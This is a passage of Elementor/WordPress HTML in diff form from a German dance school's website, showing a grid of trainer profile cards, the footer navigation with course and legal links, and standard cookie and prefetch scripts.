+				<div class="elementor-element elementor-element-aae1c1f elementor-grid-3 elementor-grid-tablet-2 elementor-grid-mobile-1 elementor-widget elementor-widget-loop-grid" data-id="aae1c1f" data-element_type="widget" data-settings="{&quot;template_id&quot;:10129,&quot;row_gap&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:20,&quot;sizes&quot;:[]},&quot;row_gap_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;_skin&quot;:&quot;post&quot;,&quot;columns&quot;:&quot;3&quot;,&quot;columns_tablet&quot;:&quot;2&quot;,&quot;columns_mobile&quot;:&quot;1&quot;,&quot;edit_handle_selector&quot;:&quot;[data-elementor-type=\&quot;loop-item\&quot;]&quot;,&quot;row_gap_widescreen&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;row_gap_laptop&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;row_gap_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="loop-grid.post">
+				<div class="elementor-widget-container">
+							<div class="elementor-loop-container elementor-grid" role="list">
+		<style id="loop-10129">.elementor-10129 .elementor-element.elementor-element-44d35d0{--display:flex;--min-height:300px;--flex-direction:column;--container-widget-width:100%;--container-widget-height:initial;--container-widget-flex-grow:0;--container-widget-align-self:initial;--flex-wrap-mobile:wrap;--justify-content:flex-end;--border-radius:20px 20px 20px 20px;--margin-top:0px;--margin-bottom:0px;--margin-left:0px;--margin-right:0px;}.elementor-10129 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .elementor-10129 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-position:top right;background-repeat:no-repeat;background-size:cover;}.elementor-10129 .elementor-element.elementor-element-d515096 .elementor-heading-title{text-transform:uppercase;color:#FFFFFF;}@media(min-width:1501px){.elementor-10129 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .elementor-10129 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-attachment:scroll;}}@media(max-width:767px){.elementor-10129 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .elementor-10129 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-position:center right;}.elementor-10129 .elementor-element.elementor-element-d515096 .elementor-heading-title{font-size:2em;}}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-13288 post-13288 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/nicole/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Nicole</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+				<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-13287 post-13287 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/elena/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Elena</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-13258 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-13258 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2025/11/Maksym-Teamfoto-2.png");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-13258 post-13258 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/maksym/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Maksym</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-12915 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-12915 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2025/07/Trainerfoto-Rafaela.png");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-12915 post-12915 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/rafaela/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Rafaela</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-12911 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-12911 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2025/07/Teamfoto-Ari-500x400-1.png");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-12911 post-12911 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/arianna-mosca/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Arianna</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-12890 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-12890 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2025/07/Omar-Bild-Teamseite-500x400-1.png");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-12890 post-12890 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/omar-qiami/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Omar</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-12310 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-12310 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2024/09/leticia_500x400.jpg");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-12310 post-12310 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/leticia/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Leticia</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-10950 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-10950 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2024/01/Angi-Teamfoto.png");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-10950 post-10950 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/angi/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Angi</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-6789 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-6789 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/03/katja02_500x400.jpg");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-6789 post-6789 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/katja/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Katja</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-6396 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-6396 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/03/India01_500x400.jpg");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-6396 post-6396 trainer type-trainer status-publish hentry category-allgemein" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/india-ayres-jones/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">India</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-6606 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-6606 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/03/vanessa02_500x400.jpg");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-6606 post-6606 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/vanessa/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Vanessa</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-6599 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-6599 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/03/lino02_500x400.jpg");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-6599 post-6599 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/lino-fernando-schubert/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Lino</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-6586 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-6586 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/03/enzo02_500x400.jpg");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-6586 post-6586 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/enzo-greco/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Enzo</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+		<style id="loop-dynamic-10129">.e-loop-item-7506 .elementor-element.elementor-element-44d35d0:not(.elementor-motion-effects-element-type-background), .e-loop-item-7506 .elementor-element.elementor-element-44d35d0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/03/kaksi03_500x400.jpg");}</style>		<div data-elementor-type="loop-item" data-elementor-id="10129" class="elementor elementor-10129 e-loop-item e-loop-item-7506 post-7506 trainer type-trainer status-publish hentry" data-elementor-post-type="elementor_library" data-custom-edit-handle="1">
+			<a class="elementor-element elementor-element-44d35d0 e-flex e-con-boxed e-con e-parent" data-id="44d35d0" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" href="https://motsimabuse-dietanzschule.de/trainer/karin/">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-d515096 elementor-widget elementor-widget-heading" data-id="d515096" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Karin</h3>				</div>
+				</div>
+					</div>
+				</a>
+				</div>
+				</div>
+		
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+		
+			</div>
+
+	
+</main>
+
+			<footer data-elementor-type="footer" data-elementor-id="2392" class="elementor elementor-2392 elementor-location-footer" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-98af58a e-flex e-con-boxed e-con e-parent" data-id="98af58a" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;shape_divider_top&quot;:&quot;tilt&quot;}">
+					<div class="e-con-inner">
+				<div class="elementor-shape elementor-shape-top" aria-hidden="true" data-negative="false">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1000 100" preserveaspectratio="none">
+	<path class="elementor-shape-fill" d="M0,6V0h1000v100L0,6z"/>
+</svg>		</div>
+		<div class="elementor-element elementor-element-24924b7 e-con-full e-flex e-con e-child" data-id="24924b7" data-element_type="container">
+				<div class="elementor-element elementor-element-06e1e21 elementor-widget elementor-widget-image" data-id="06e1e21" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img src="https://motsimabuse-dietanzschule.de/wp-content/uploads/2021/01/logo_ww.svg" class="attachment-full size-full wp-image-98" alt="" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-a64beb4 elementor-widget elementor-widget-text-editor" data-id="a64beb4" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Werde ein Teil der Tanzschul-Family der Motsi Mabuse Taunustanzschule in Kelkheim, zentral im Rhein-Main-Gebiet gelegen.  </p>								</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-33ba9f1 e-con-full e-flex e-con e-child" data-id="33ba9f1" data-element_type="container">
+				<div class="elementor-element elementor-element-dbc0e63 e-transform elementor-widget elementor-widget-heading" data-id="dbc0e63" data-element_type="widget" data-settings="{&quot;_transform_rotateZ_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:-1,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_widescreen&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_laptop&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_tablet&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_mobile&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">DIE TANZSCHULE</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-d12effe elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="d12effe" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+							<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/aboutus/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Über uns</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/kontakt/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Kontakt</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/kontakt/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Anfahrt</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/impressum/" rel="nofollow">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Impressum</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/datenschutzerklaerung/" rel="nofollow">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Datenschutz</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/wp-content/uploads/2025/08/AGB.pdf" rel="nofollow">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">AGB</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="#" rel="nofollow" class="borlabs-cookie-preference">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Cookies</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="/newsletter">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Newsletter</span>
+											</a>
+									</li>
+						</ul>
+						</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-93796ae e-con-full e-flex e-con e-child" data-id="93796ae" data-element_type="container">
+				<div class="elementor-element elementor-element-00da172 e-transform elementor-widget elementor-widget-heading" data-id="00da172" data-element_type="widget" data-settings="{&quot;_transform_rotateZ_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:-1,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_widescreen&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_laptop&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_tablet&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_rotateZ_effect_mobile&quot;:{&quot;unit&quot;:&quot;deg&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">KURSE &amp; EVENTS</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-ebdcd29 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="ebdcd29" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+							<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-kinder-und-jugendliche/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Kurse für Kinder</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-kinder-und-jugendliche/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Kurse für Jugendliche</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-erwachsene/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Kurse für Erwachsene</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/kursuebersicht/paarkurse/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Kurse für Paare</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Privatkurse</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/event/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Events</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/fitness/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Fitnesskurse</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="https://motsimabuse-dietanzschule.de/online-kurse/">
+
+												<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="icon icon-right-arrow2"></i>						</span>
+										<span class="elementor-icon-list-text">Onlinekurse</span>
+											</a>
+									</li>
+						</ul>
+						</div>
+				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-d36c5b4 e-flex e-con-boxed e-con e-parent" data-id="d36c5b4" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-602cda1 elementor-hidden-mobile elementor-widget elementor-widget-text-editor" data-id="602cda1" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									© 2023 &#8211; Motsi Mabuse &#8211; Die Taunus-Tanzschule GmbH | made with 🤍 by fishingforthewild								</div>
+				</div>
+				<div class="elementor-element elementor-element-49afdbc elementor-hidden-widescreen elementor-hidden-desktop elementor-hidden-laptop elementor-hidden-tablet elementor-widget elementor-widget-text-editor" data-id="49afdbc" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>© 2023 &#8211; Motsi Mabuse &#8211; Die Taunus-Tanzschule GmbH  Made with 🤍 by fishingforthewild</p>								</div>
+				</div>
+					</div>
+				</div>
+				</footer>
+		
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/hello-theme-child-master\/*","\/wp-content\/themes\/hello-elementor\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+<script type="module" src="https://motsimabuse-dietanzschule.de/wp-content/plugins/borlabs-cookie/assets/javascript/borlabs-cookie.min.js?ver=3.3.21.1" id="borlabs-cookie-core-js-module" data-cfasync="false" data-no-minify="1" data-no-optimize="1"></script>
+		<div data-elementor-type="popup" data-elementor-id="9868" class="elementor elementor-9868 elementor-location-popup" data-elementor-settings="{&quot;open_selector&quot;:&quot;a[href=\&quot;#wochenplan\&quot;]&quot;,&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;triggers&quot;:[],&quot;timing&quot;:[]}" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-bf4d62f e-flex e-con-boxed e-con e-parent" data-id="bf4d62f" data-element_type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-2290f52 elementor-widget elementor-widget-heading" data-id="2290f52" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Der Wochenplan</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-a6e1eee elementor-widget elementor-widget-text-editor" data-id="a6e1eee" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
